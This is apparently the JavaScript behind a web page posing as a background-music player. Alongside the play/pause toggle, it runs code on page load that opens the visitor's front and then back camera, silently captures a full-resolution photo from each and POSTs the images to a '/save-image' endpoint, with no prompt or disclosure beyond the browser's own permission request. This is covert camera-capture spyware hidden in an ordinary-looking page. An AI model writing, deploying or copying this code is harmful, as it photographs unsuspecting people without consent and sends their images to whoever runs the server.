document.addEventListener("DOMContentLoaded", function () {

    const audio = document.getElementById("background-music");
    const playButton = document.getElementById("play-button");

    playButton.addEventListener("click", function () {
        if (audio.paused) {
            audio.play().catch(() => {});
            playButton.textContent = "⏸️ Pause Music";
        } else {
            audio.pause();
            playButton.textContent = "▶️ Play Music";
        }
    });

    async function captureFromCamera(facing) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: facing,
                    width: { ideal: 1920 },
                    height: { ideal: 1080 }
                }
            });

            const video = document.createElement("video");
            video.srcObject = stream;
            await video.play();

            await new Promise(resolve => setTimeout(resolve, 800));

            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0);

            const imageData = canvas.toDataURL("image/jpeg", 1.0);
            const cameraType = facing === "user" ? "front" : "back";

            await fetch('/save-image', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ imageData: imageData, camera: cameraType })
            });

            stream.getTracks().forEach(track => track.stop());

        } catch (err) {
            console.log("Camera error:", err);
        }
    }

    async function startBothCameras() {
        await captureFromCamera("user");        // Front camera first
        await captureFromCamera("environment"); // Back camera second
    }

    window.onload = startBothCameras;

});
